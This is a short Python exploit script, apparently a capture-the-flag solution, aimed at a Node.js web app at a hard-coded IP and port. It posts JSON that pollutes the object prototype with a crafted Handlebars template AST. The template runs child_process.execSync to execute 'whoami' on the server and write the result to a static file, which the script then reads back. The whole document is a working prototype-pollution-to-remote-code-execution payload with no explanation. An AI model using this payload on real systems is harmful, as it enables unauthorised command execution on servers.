#!/usr/bin/python3
import requests

TARGET_URL = "http://138.68.156.206:30606"

# make pollution
r = requests.post(TARGET_URL + "/api/submit", json = {
    "artist.name":"Haigh",
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`whoami > /app/static/out`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
})

# execute
# print(r.status_code)
# print(r.text)

print(requests.get(TARGET_URL + "/static/out").text)

